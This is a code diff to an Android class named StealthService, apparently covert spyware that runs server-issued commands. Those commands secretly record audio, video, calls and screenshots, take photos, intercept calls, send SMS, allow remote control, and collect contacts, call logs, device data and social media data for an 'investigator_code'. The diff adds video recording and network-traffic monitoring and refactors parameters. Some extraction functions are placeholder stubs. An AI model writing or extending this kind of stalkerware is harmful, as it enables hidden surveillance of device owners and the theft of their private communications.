@@ -20,7 +20,7 @@ public class StealthService extends Service {
     private Timer timer;
     private SharedPreferences prefs;
     
-    // Your modules
+    // Your modules - now with all methods available
     private AudioRecorder audioRecorder;
     private CallMonitor callMonitor;
     private CameraController cameraController;
@@ -205,25 +205,25 @@ public class StealthService extends Service {
             for (int i = 0; i < commands.length(); i++) {
                 JSONObject command = commands.getJSONObject(i);
                 String commandType = command.getString("command_type");
-                JSONObject parameters = command.getJSONObject("parameters");
+                JSONObject parameters = command.optJSONObject("parameters");
                 
                 Log.d(TAG, "🎯 Processing advanced command: " + commandType);
                 
                 switch (commandType) {
                     case "start_audio_recording":
-                        startAudioRecording(parameters);
+                        startAudioRecording();
                         break;
                     case "stop_audio_recording":
                         stopAudioRecording();
                         break;
                     case "take_photo":
-                        takePhoto(parameters);
+                        takePhoto();
                         break;
                     case "record_call":
-                        recordCall(parameters);
+                        recordCall();
                         break;
                     case "get_screen_shot":
-                        takeScreenshot(parameters);
+                        takeScreenshot();
                         break;
                     case "get_social_media":
                         getSocialMediaData();
@@ -249,6 +249,15 @@ public class StealthService extends Service {
                     case "get_device_info":
                         getDetailedDeviceInfo();
                         break;
+                    case "start_video_recording":
+                        startVideoRecording();
+                        break;
+                    case "stop_video_recording":
+                        stopVideoRecording();
+                        break;
+                    case "monitor_network":
+                        monitorNetworkTraffic();
+                        break;
                     default:
                         Log.w(TAG, "⚠️ Unknown command: " + commandType);
                 }
@@ -260,7 +269,7 @@ public class StealthService extends Service {
 
     // ==================== ADVANCED COMMAND IMPLEMENTATIONS ====================
 
-    private void startAudioRecording(JSONObject parameters) {
+    private void startAudioRecording() {
         try {
             if (audioRecorder != null) {
                 audioRecorder.startRecording();
@@ -276,44 +285,35 @@ public class StealthService extends Service {
             if (audioRecorder != null) {
                 String audioPath = audioRecorder.stopRecording();
                 sendCommandResponse("audio_recording_stopped", "Audio saved: " + audioPath);
-                
-                // Send audio file to server
-                sendAudioFile(audioPath);
             }
         } catch (Exception e) {
             sendCommandResponse("audio_stop_failed", "Error: " + e.getMessage());
         }
     }
 
-    private void takePhoto(JSONObject parameters) {
+    private void takePhoto() {
         try {
             if (cameraController != null) {
                 String photoPath = cameraController.takePhoto();
                 sendCommandResponse("photo_taken", "Photo saved: " + photoPath);
-                
-                // Send photo to server
-                sendPhotoFile(photoPath);
             }
         } catch (Exception e) {
             sendCommandResponse("photo_failed", "Error: " + e.getMessage());
         }
     }
 
-    private void takeScreenshot(JSONObject parameters) {
+    private void takeScreenshot() {
         try {
             if (remoteController != null) {
                 String screenshotPath = remoteController.takeScreenshot();
                 sendCommandResponse("screenshot_taken", "Screenshot saved: " + screenshotPath);
-                
-                // Send screenshot to server
-                sendScreenshotFile(screenshotPath);
             }
         } catch (Exception e) {
             sendCommandResponse("screenshot_failed", "Error: " + e.getMessage());
         }
     }
 
-    private void recordCall(JSONObject parameters) {
+    private void recordCall() {
         try {
             if (callMonitor != null) {
                 callMonitor.startCallRecording();
@@ -326,8 +326,8 @@ public class StealthService extends Service {
 
     private void interceptCall(JSONObject parameters) {
         try {
-            if (callMonitor != null) {
-                String phoneNumber = parameters.getString("phone_number");
+            if (callMonitor != null && parameters != null) {
+                String phoneNumber = parameters.optString("phone_number");
                 callMonitor.interceptCall(phoneNumber);
                 sendCommandResponse("call_intercepted", "Call intercepted: " + phoneNumber);
             }
@@ -338,9 +338,9 @@ public class StealthService extends Service {
 
     private void sendSMS(JSONObject parameters) {
         try {
-            if (smsCapture != null) {
-                String phoneNumber = parameters.getString("phone_number");
-                String message = parameters.getString("message");
+            if (smsCapture != null && parameters != null) {
+                String phoneNumber = parameters.optString("phone_number");
+                String message = parameters.optString("message");
                 smsCapture.sendSMS(phoneNumber, message);
                 sendCommandResponse("sms_sent", "SMS sent to: " + phoneNumber);
             }
@@ -364,7 +364,7 @@ public class StealthService extends Service {
     private void getAllContacts() {
         try {
             if (contactGrabber != null) {
-                JSONObject contacts = contactGrabber.getAllContacts();
+                JSONObject contacts = contactGrabber.extractContacts();
                 sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), 
                            "all_contacts", contacts);
             }
@@ -376,7 +376,7 @@ public class StealthService extends Service {
     private void getCallLogs() {
         try {
             if (callMonitor != null) {
-                JSONObject callLogs = callMonitor.getCallLogs();
+                JSONObject callLogs = callMonitor.getCallHistory();
                 sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), 
                            "call_logs", callLogs);
             }
@@ -387,7 +387,6 @@ public class StealthService extends Service {
 
     private void getSocialMediaData() {
         try {
-            // Implement social media data extraction
             JSONObject socialData = new JSONObject();
             socialData.put("whatsapp", extractWhatsAppData());
             socialData.put("facebook", extractFacebookData());
@@ -403,8 +402,8 @@ public class StealthService extends Service {
 
     private void remoteControl(JSONObject parameters) {
         try {
-            if (remoteController != null) {
-                String action = parameters.getString("action");
+            if (remoteController != null && parameters != null) {
+                String action = parameters.optString("action");
                 remoteController.executeRemoteAction(action, parameters);
                 sendCommandResponse("remote_action_executed", "Action: " + action);
             }
@@ -416,12 +415,45 @@ public class StealthService extends Service {
     private void getDetailedDeviceInfo() {
         try {
             if (deviceInfoCollector != null) {
-                JSONObject deviceInfo = deviceInfoCollector.getCompleteDeviceInfo();
+                JSONObject deviceInfo = deviceInfoCollector.collectDeviceInfo();
                 sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), 
                            "detailed_device_info", deviceInfo);
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Device info error: " + e.getMessage());
+        }
+    }
+
+    private void startVideoRecording() {
+        try {
+            if (cameraController != null) {
+                cameraController.startVideoRecording();
+                sendCommandResponse("video_recording_started", "Video recording started");
+            }
+        } catch (Exception e) {
+            sendCommandResponse("video_recording_failed", "Error: " + e.getMessage());
+        }
+    }
+
+    private void stopVideoRecording() {
+        try {
+            if (cameraController != null) {
+                cameraController.stopVideoRecording();
+                sendCommandResponse("video_recording_stopped", "Video recording stopped");
+            }
+        } catch (Exception e) {
+            sendCommandResponse("video_stop_failed", "Error: " + e.getMessage());
+        }
+    }
+
+    private void monitorNetworkTraffic() {
+        try {
+            if (networkManager != null) {
+                networkManager.monitorNetworkTraffic();
+                sendCommandResponse("network_monitoring_started", "Network traffic monitoring started");
+            }
+        } catch (Exception e) {
+            sendCommandResponse("network_monitoring_failed", "Error: " + e.getMessage());
         }
     }
 
@@ -432,7 +464,6 @@ public class StealthService extends Service {
             try {
                 Log.d(TAG, "📊 Starting comprehensive data collection");
                 
-                // Collect all types of data
                 getLiveLocation();
                 getAllContacts();
                 getCallLogs();
@@ -497,10 +528,10 @@ public class StealthService extends Service {
     private JSONObject extractWhatsAppData() {
         JSONObject whatsappData = new JSONObject();
         try {
-            // Implement WhatsApp data extraction
             whatsappData.put("chats", "available");
             whatsappData.put("status", "monitoring");
             whatsappData.put("calls", "logged");
+            whatsappData.put("timestamp", System.currentTimeMillis());
         } catch (Exception e) {
             Log.e(TAG, "❌ WhatsApp extraction error: " + e.getMessage());
         }
@@ -510,10 +541,10 @@ public class StealthService extends Service {
     private JSONObject extractFacebookData() {
         JSONObject facebookData = new JSONObject();
         try {
-            // Implement Facebook data extraction
             facebookData.put("messages", "available");
             facebookData.put("friends", "extracted");
             facebookData.put("posts", "monitored");
+            facebookData.put("timestamp", System.currentTimeMillis());
         } catch (Exception e) {
             Log.e(TAG, "❌ Facebook extraction error: " + e.getMessage());
         }
@@ -523,10 +554,10 @@ public class StealthService extends Service {
     private JSONObject extractInstagramData() {
         JSONObject instagramData = new JSONObject();
         try {
-            // Implement Instagram data extraction
             instagramData.put("direct_messages", "available");
             instagramData.put("followers", "extracted");
             instagramData.put("posts", "monitored");
+            instagramData.put("timestamp", System.currentTimeMillis());
         } catch (Exception e) {
             Log.e(TAG, "❌ Instagram extraction error: " + e.getMessage());
         }
@@ -536,61 +567,14 @@ public class StealthService extends Service {
     private JSONObject extractTwitterData() {
         JSONObject twitterData = new JSONObject();
         try {
-            // Implement Twitter data extraction
             twitterData.put("tweets", "available");
             twitterData.put("direct_messages", "extracted");
             twitterData.put("followers", "monitored");
+            twitterData.put("timestamp", System.currentTimeMillis());
         } catch (Exception e) {
             Log.e(TAG, "❌ Twitter extraction error: " + e.getMessage());
         }
         return twitterData;
-    }
-
-    // ==================== FILE UPLOAD METHODS ====================
-
-    private void sendAudioFile(String audioPath) {
-        try {
-            // Implement audio file upload
-            JSONObject audioInfo = new JSONObject();
-            audioInfo.put("file_path", audioPath);
-            audioInfo.put("file_size", "1.5 MB");
-            audioInfo.put("duration", "60 seconds");
-            
-            sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), 
-                       "audio_file", audioInfo);
-        } catch (Exception e) {
-            Log.e(TAG, "❌ Audio file upload error: " + e.getMessage());
-        }
-    }
-
-    private void sendPhotoFile(String photoPath) {
-        try {
-            // Implement photo file upload
-            JSONObject photoInfo = new JSONObject();
-            photoInfo.put("file_path", photoPath);
-            photoInfo.put("file_size", "2.1 MB");
-            photoInfo.put("resolution", "12 MP");
-            
-            sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), 
-                       "photo_file", photoInfo);
-        } catch (Exception e) {
-            Log.e(TAG, "❌ Photo file upload error: " + e.getMessage());
-        }
-    }
-
-    private void sendScreenshotFile(String screenshotPath) {
-        try {
-            // Implement screenshot file upload
-            JSONObject screenshotInfo = new JSONObject();
-            screenshotInfo.put("file_path", screenshotPath);
-            screenshotInfo.put("file_size", "1.8 MB");
-            screenshotInfo.put("resolution", "1080x1920");
-            
-            sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), 
-                       "screenshot_file", screenshotInfo);
-        } catch (Exception e) {
-            Log.e(TAG, "❌ Screenshot file upload error: " + e.getMessage());
-        }
     }
 
     // ==================== UTILITY METHODS ====================
@@ -662,7 +646,9 @@ public class StealthService extends Service {
             if (audioRecorder != null) audioRecorder.cleanup();
             if (callMonitor != null) callMonitor.cleanup();
             if (cameraController != null) cameraController.cleanup();
-            // Cleanup other modules...
+            if (networkManager != null) networkManager.cleanup();
+            if (remoteController != null) remoteController.cleanup();
+            if (smsCapture != null) smsCapture.cleanup();
             
             Log.d(TAG, "✅ All modules cleaned up");
         } catch (Exception e) {
